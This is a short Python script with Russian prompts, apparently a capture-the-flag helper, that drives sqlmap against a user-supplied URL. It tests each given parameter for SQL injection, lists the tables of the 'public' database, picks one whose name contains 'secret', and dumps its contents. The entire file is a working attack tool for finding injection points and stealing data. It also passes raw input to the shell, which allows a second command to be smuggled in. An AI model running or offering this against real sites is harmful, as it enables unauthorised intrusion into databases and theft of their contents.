import subprocess


url = input('Введите URl: ')
params = input("Введите параметры: ").split()
injectable_params=[]
for param in params:
    process = subprocess.Popen(f"sqlmap -u '{url}?{param}=hack' --dbs -p {param} --batch -v 0", shell=True, stdout=subprocess.PIPE)
    output, _ = process.communicate()
    if "DBMS" in output.decode(): injectable_params.append(param)



param=injectable_params[0]
process = subprocess.Popen(f"sqlmap -u '{url}?{param}=hack' -p {param} --batch -v 0 -D public --tables", shell=True, stdout=subprocess.PIPE)
output, _ = process.communicate()
for line in output.decode().split():
    if "secret" in line:
        secret_table = line.strip("'")
        break

process = subprocess.Popen(f"sqlmap -u '{url}?{param}=hack' -p {param} --batch -v 0 -D public -T {secret_table} --dump", shell=True, stdout=subprocess.PIPE)
output, _ = process.communicate()
print(output.decode())

print("Уязвимые параметры: ", *injectable_params)
